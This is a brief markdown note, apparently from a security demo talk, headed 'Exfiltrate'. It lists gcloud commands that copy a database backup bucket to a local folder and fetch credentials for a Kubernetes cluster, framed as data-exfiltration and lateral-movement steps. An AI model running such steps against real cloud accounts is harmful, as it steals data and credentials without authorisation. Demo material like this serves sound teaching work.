# Exfiltrate 

## The database backup bucket

```bash
mkdir -p /root/demotalk/exfiltrate
cd /root/demotalk/exfiltrate
gcloud storage cp -r gs://conduit-database-backup-test/ .
```

## Connect to Kubernetes

```bash
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
```